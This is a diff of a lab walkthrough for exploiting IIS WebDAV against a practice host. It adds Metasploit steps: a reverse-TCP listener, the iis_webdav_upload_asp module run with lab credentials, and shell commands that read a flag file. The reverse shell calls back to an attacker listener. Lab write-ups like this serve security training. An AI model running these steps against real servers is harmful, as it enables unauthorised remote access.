@@ -44,6 +44,7 @@ The first step of the exploitation process will involve identifying whether WebD
 - `put /root/shell.asp` Paste asp file on webserver. The next step would be to connect to the webserver and execute it. But before we can do this, we need a listener or a handler that will receive the reverse connection and then send the stage that will then provide us with the meterpreter session when executed. 
 
 ### Use Multihandler as listener
+
 - `service postgresql start`
 - `msfconsole`
 - `use multi/handler`
@@ -52,3 +53,19 @@ The first step of the exploitation process will involve identifying whether WebD
 - `set LHOST 10.10.37.7`
 - `set LPORT 1234`
 - `run` Start listener(reverse TCP handler) and waits for a connection from the actual asp payload we have created. 
+
+### Run metasploit framework and exploit the target using the IIS webdav exploit module.
+
+- `service postgresql start`
+- `msfconsole`
+- `use exploit/windows/iis/iis_webdav_upload_asp`
+- `set RHOSTS demo.ine.local`
+- `set HttpUsername bob`
+- `set HttpPassword password_123321`
+- `set PATH /webdav/metasploit%RAND%.asp`
+- `exploit`
+After We have got a Meterpreter session:
+- `shell` open shell
+- `cd /`
+- `dir`
+- `type flag.txt` This reveals the flag to us.
